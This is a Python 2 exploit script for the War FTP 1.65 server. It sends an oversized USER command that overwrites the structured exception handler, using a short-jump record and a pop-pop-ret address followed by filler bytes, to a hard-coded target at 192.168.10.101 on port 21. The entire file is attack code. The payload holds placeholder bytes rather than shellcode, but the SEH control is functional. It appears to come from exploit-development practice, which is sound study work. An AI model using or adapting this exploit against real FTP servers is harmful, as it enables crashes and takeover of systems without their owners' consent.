#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development warftp 1.65

import sys
import socket 

seh = "\x03\x84\x45" #0x00458403 pop ebx pop ecx ret 
nseh = "\xeb\x06\x90\x90" #next seh handler 
payload = '\x43' * ( 1500 - len(seh) - len(nseh) - 1008 ) 
password = "user"
username = '\x41' * 1004 + nseh + seh + payload 
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	#connect to the host 
	connect.connect(("192.168.10.101", 21))

except:

	print "[-] Connection Error"
	response = connect.recv(1024)
	print response
	sys.exit(1)

#send username to the server 
connect.send("user %s\r\n" %username)
response = connect.recv(1024)
print response 

#send password to the server 
connect.send("pass %s\r\n" %password)
response = connect.recv(1024)
print response 

connect.close()

